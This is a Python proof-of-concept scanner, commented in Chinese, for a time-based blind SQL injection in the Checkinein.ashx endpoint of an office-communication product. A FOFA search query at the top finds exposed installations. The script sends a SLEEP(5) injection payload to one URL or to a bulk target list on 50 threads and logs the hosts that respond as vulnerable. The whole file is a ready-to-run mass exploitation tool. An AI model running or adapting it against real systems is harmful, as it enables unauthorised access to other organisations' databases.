#fofa
#body="getincommingcall"
import requests
import argparse
import sys
from multiprocessing.dummy import Pool
import time
from urllib.parse import urljoin

def poc(target):
    """
    检测目标是否存在SQL注入漏洞
    """
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    payload = "/handle/Checkinein.ashx?type=checkingin&loename='+and+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+and+ '&date=1"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
    }

    try:
        # 测试正常请求的响应时间
        start_time = time.time()
        re1 = requests.get(url=target, headers=headers, timeout=10, verify=False)
        normal_time = time.time() - start_time
        
        if re1.status_code != 200:
            print(f"[*] 该网站 {target} 访问有问题，状态码: {re1.status_code}")
            return

        # 测试payload请求的响应时间
        target_url = urljoin(target, payload)
        start_time = time.time()
        re2 = requests.post(url=target_url, headers=headers, timeout=15, verify=False)
        payload_time = time.time() - start_time

        print(f"[*] 目标: {target}")
        print(f"    正常请求时间: {normal_time:.2f}秒")
        print(f"    Payload请求时间: {payload_time:.2f}秒")
        print(f"    时间差: {payload_time - normal_time:.2f}秒")

        # 判断是否存在漏洞
        if payload_time >= 5 and (payload_time - normal_time) >= 4.5:  # 考虑网络波动
            print(f"[+] 该网站 {target} 存在SQL注入漏洞!")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f'{target}\n')
        else:
            print(f"[-] 该网站 {target} 不存在SQL注入漏洞")
            
    except requests.exceptions.Timeout:
        print(f"[*] {target} 请求超时")
    except requests.exceptions.ConnectionError:
        print(f"[*] {target} 连接错误")
    except requests.exceptions.RequestException as e:
        print(f"[*] {target} 请求异常: {e}")
    except Exception as e:
        print(f"[*] {target} 发生未知错误: {e}")

def main():
    """
    主函数
    """
    # 禁用SSL警告
    requests.packages.urllib3.disable_warnings()
    
    parser = argparse.ArgumentParser(
        description="傲发办公通信专家 Checkingin.ashx SQL注入漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:
  python sql_scanner.py -u http://example.com
  python sql_scanner.py -f targets.txt
        '''
    )

    parser.add_argument('-u', '--url', type=str, help='单个URL测试')
    parser.add_argument('-f', '--file', type=str, help='URL文件批量测试')
    parser.add_argument('-t', '--threads', type=int, default=50, help='线程数 (默认: 50)')
    parser.add_argument('-o', '--output', type=str, default='result.txt', help='输出文件 (默认: result.txt)')

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)

    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                url_list = [line.strip() for line in f if line.strip()]
            
            print(f"[*] 共读取 {len(url_list)} 个目标")
            print(f"[*] 开始检测，线程数: {args.threads}")
            
            pool = Pool(args.threads)
            pool.map(poc, url_list)
            pool.close()
            pool.join()
            
            print("[*] 检测完成")
        except FileNotFoundError:
            print(f"[!] 文件 {args.file} 不存在")
        except Exception as e:
            print(f"[!] 读取文件时发生错误: {e}")

if __name__ == '__main__':

    main()
